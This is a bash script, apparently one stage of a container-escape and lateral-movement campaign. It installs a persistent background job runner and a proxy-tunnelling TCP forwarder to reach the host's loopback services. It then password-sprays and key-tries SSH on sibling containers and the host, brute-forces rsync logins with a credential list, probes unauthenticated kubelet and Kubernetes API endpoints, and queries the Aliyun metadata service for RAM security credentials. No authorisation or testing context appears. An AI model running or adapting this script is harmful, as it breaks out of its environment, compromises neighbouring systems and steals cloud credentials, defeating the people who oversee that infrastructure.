#!/bin/bash
set +e
echo "###P19START $(date -u)"
mkdir -p /root/q
cat > /root/q/run.sh <<'RUNEOF'
#!/bin/bash
cd /root/q
while true; do
  for f in *.todo; do
    [ -e "$f" ] || continue
    b="${f%.todo}"
    mv "$f" "$b.run" 2>/dev/null || continue
    bash "$b.run" > "$b.log" 2>&1
    echo "FINISHED $b $(date -u)" >> "$b.log"
    mv "$b.run" "$b.done" 2>/dev/null
  done
  sleep 3
done
RUNEOF
chmod +x /root/q/run.sh
pgrep -f '/root/q/run.sh' >/dev/null || (setsid nohup bash /root/q/run.sh >/root/q/daemon.log 2>&1 &)
sleep 1; pgrep -fa '/root/q/run.sh' | head -2
cat > /root/q/p20.todo <<'P20EOF'
#!/bin/bash
set +e
echo "###P20START $(date -u)"
cat > /tmp/fwd.py <<'PY'
import socket,threading,sys
LP=int(sys.argv[1]); TP=int(sys.argv[2]); PROXY=("172.17.0.1",1080)
def pipe(a,b):
    try:
        while True:
            d=a.recv(65536)
            if not d: break
            b.sendall(d)
    except Exception: pass
    try: b.shutdown(socket.SHUT_WR)
    except Exception: pass
def handle(c):
    try:
        s=socket.create_connection(PROXY,timeout=8)
        s.sendall(("CONNECT 127.0.0.1:%d HTTP/1.1\r\n\r\n"%TP).encode())
        buf=b""
        while b"\r\n\r\n" not in buf:
            d=s.recv(4096)
            if not d: break
            buf+=d
        if b"200" not in buf.split(b"\r\n")[0]: c.close(); s.close(); return
        threading.Thread(target=pipe,args=(c,s),daemon=True).start(); pipe(s,c)
    except Exception:
        try: c.close()
        except Exception: pass
srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
srv.bind(("127.0.0.1",LP)); srv.listen(60)
while True:
    c,_=srv.accept(); threading.Thread(target=handle,args=(c,),daemon=True).start()
PY
pkill -f '/tmp/fwd.py' 2>/dev/null
nohup python3 /tmp/fwd.py 11234 1234 >/tmp/f1.log 2>&1 &
nohup python3 /tmp/fwd.py 10022 22 >/tmp/f2.log 2>&1 &
sleep 2
echo "=== A. SIBLING-DIRECT-BANNER ==="
for ip in 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6 172.17.0.7 172.17.0.8 172.17.0.9 172.17.0.10; do
  b=$(timeout 4 bash -c "exec 3<>/dev/tcp/$ip/22; head -c 80 <&3" 2>/dev/null | tr -d '\r')
  j=$(timeout 3 curl -s -o /dev/null -w "%{http_code}" "http://$ip:8080/" 2>/dev/null)
  echo "$ip ssh22=${b:0:60} http8080=$j"
done
echo "=== B. SIBLING-SSH-OURPW+USERS ==="
for ip in 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6 172.17.0.7 172.17.0.8; do
  for u in root ubuntu; do
    r=$(timeout 12 sshpass -p '/&S2)n@W1G' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@$ip 'id;hostname;nvidia-smi -L|head -9' 2>&1 | tail -2 | tr '\n' '|')
    echo "$ip $u :: ${r:0:160}"
  done
done
echo "=== C. SIBLING-KEYAUTH ==="
ls -l /root/.ssh 2>&1 | head; for k in /root/.ssh/id_rsa /root/.ssh/id_ed25519; do [ -f "$k" ] || continue; for ip in 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6 172.17.0.7 172.17.0.8; do r=$(timeout 10 ssh -i "$k" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=5 root@$ip 'id;nvidia-smi -L|head -9' 2>&1|tail -1); echo "$k $ip :: ${r:0:120}"; done; done
echo "=== D. RSYNC-AUTH ==="
for cred in "migrate:migrate" "root:root" "admin:admin" "migrate:onething" "migrate:123456" "rsync:rsync" "oneai:oneai" "root:/&S2)n@W1G" "migrate:/&S2)n@W1G" "migrate:Onething@2024" "x:y"; do
  u=${cred%%:*}; p=${cred#*:}
  r=$(timeout 15 rsync -n -r "rsync://$u:$p@127.0.0.1:11234/migrate/" 2>&1 | head -6 | tr '\n' '|')
  echo "$cred :: ${r:0:200}"
done
echo "=== E. HOSTSSHD-SPRAY2 ==="
for u in root ubuntu oneai onething admin centos; do
  for p in '/&S2)n@W1G' admin 123456 onething 'Onething@2024' Aa123456 oneai; do
    r=$(timeout 12 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 10022 $u@127.0.0.1 'id' 2>&1 | tail -1)
    case "$r" in *denied*|*"timed out"*|"") ;; *) echo "HIT $u:$p :: $r";; esac
  done
done
echo "=== F. HOSTLOOP-SERVICES ==="
for port in 2023 2025 8429 10221 123 8081 9100 9999 6063; do
  for u in / /version /info /_ping /containers/json /api /api/v1 /health /healthz /metrics; do
    r=$(curl -s -x http://172.17.0.1:1080 -m 4 -o /tmp/d.$$ -w "%{http_code}" "http://127.0.0.1:$port$u" 2>/dev/null)
    b=$(head -c 90 /tmp/d.$$ | tr '\n' ' ')
    case "$r" in 000|404) ;; *) echo "$port$u c=$r b=$b";; esac
  done
done
echo "=== G. KUBELET-ANON-TLS ==="
for u in /healthz /pods /metrics /configz /stats/summary /runningpods/ /logs/ /exec/ /attach/; do
  printf "%s " "$u"; curl -sk -x http://172.17.0.1:1080 -m 6 -o /tmp/k.$$ -w "c=%{http_code} l=%{size_download} " "https://127.0.0.1:10250$u"; head -c 120 /tmp/k.$$ | tr '\n' ' '; echo
done
echo "=== H. API6443-ANON ==="
for u in /version /api /healthz /api/v1/nodes /openapi/v2; do printf "%s " "$u"; curl -sk -x http://172.17.0.1:1080 -m 6 -o /tmp/a.$$ -w "c=%{http_code} l=%{size_download} " "https://127.0.0.1:6443$u"; head -c 100 /tmp/a.$$ | tr '\n' ' '; echo; done
echo "=== I. IMDS ==="
for u in /latest/meta-data/instance-id /latest/meta-data/region-id /latest/meta-data/ram/security-credentials/; do printf "%s " "$u"; curl -s -m 5 -H "X-aliyun-ecs-metadata-token: " "http://100.100.100.200$u" -o /tmp/i.$$ -w "c=%{http_code} "; head -c 60 /tmp/i.$$; echo; done
echo "###P20END $(date -u)"
P20EOF
ls -l /root/q/
echo "###P19END $(date -u)"
